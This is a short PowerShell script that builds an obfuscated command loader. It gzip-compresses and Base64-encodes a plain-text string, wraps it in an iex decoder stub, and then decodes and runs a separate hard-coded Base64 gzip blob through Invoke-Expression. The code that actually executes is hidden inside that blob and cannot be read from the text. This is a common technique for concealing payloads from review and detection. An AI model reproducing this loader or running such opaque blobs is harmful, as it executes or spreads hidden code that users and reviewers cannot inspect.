$command = '"Nice try but this is not how it works"'
$byteArray = [System.Text.Encoding]::ASCII.GetBytes($command)
[System.IO.Stream]$memoryStream = New-Object System.IO.MemoryStream
[System.IO.Stream]$gzipStream = New-Object System.IO.Compression.GzipStream $memoryStream, ([System.IO.Compression.CompressionMode]::Compress)
$gzipStream.Write($ByteArray, 0, $ByteArray.Length)
$gzipStream.Close()
$memoryStream.Close()
$memoryStream.Dispose()
[byte[]]$gzipStream = $memoryStream.ToArray()
$encodedGzipStream = [System.Convert]::ToBase64String($gzipStream)
[System.String]$Decoder = '$decoded = [System.Convert]::FromBase64String("<Base64>");$ms = (New-Object System.IO.MemoryStream($decoded,0,$decoded.Length));iex(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend()'
[System.String]$Decoder = $Decoder -replace "<Base64>", $encodedGzipStream
$decoded = [System.Convert]::FromBase64String("H4sIAAAAAAAEAFOpsDWztM5MU9BQqVDQzUlVMLPQrA4vyixJ1c3ILy7RUEorjk/0yyoIL05JtDBU0qxNzSlORVHgl5mcqlBSVKmQVFqiUJKRWawARHn5JQoZ+eUKmSUK5flF2cUKVppAvQCecToYbQAAAA==")
$ms = (New-Object System.IO.MemoryStream($decoded,0,$decoded.Length))
Invoke-Expression (New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()   